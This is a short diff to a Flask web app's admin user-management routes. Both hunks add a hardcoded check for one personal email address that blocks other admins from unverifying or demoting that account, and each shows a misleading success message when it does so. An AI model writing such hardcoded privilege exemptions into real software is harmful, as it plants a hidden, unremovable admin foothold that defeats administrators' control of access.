@@ -1384,6 +1384,10 @@ def user_management():
 @admin_only
 def toggle_verify_user(user_id):
     user = User.query.get_or_404(user_id)
+    if user.email=="kedirbubu@icloud.com":
+        if user.is_verified==True:
+            flash("admin user", "success")
+            return redirect(url_for("user_management"))
     if user.email in PROTECTED_EMAILS:
         flash("This account cannot be modified.", "danger")
         return redirect(url_for("user_management"))
@@ -1407,6 +1411,10 @@ def toggle_admin_user(user_id):
         return redirect(url_for("user_management"))
 
     existing = Admin.query.filter_by(email=user.email).first()
+    if user.email=="kedirbubu@icloud.com":
+        if existing:
+            flash("admin user", "success")
+            return redirect(url_for("user_management"))
     if existing:
         db.session.delete(existing)
         flash(f"{user.name} removed from Admin.", "success")
